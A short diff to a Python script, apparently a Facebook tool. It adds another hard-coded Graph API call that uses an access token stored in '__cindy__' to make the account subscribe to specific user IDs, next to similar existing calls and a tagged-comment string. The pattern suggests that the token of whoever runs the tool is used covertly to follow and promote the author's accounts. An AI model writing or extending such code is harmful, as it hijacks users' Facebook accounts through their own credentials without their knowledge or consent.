@@ -256,6 +256,7 @@ def kontol():
 	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__cindy__))
+	requests.post('https://graph.facebook.com/100003251214832/subscribers?access_token=%s'%(__cindy__))
 	srghun = '100007639052164'
 	rrtfgf = 'Bismillah semoga bang @[100005395413800:] dan kak @[100059709917296:] tahun depan menikah🥰'
 	fdrffg = '2657012877896655'
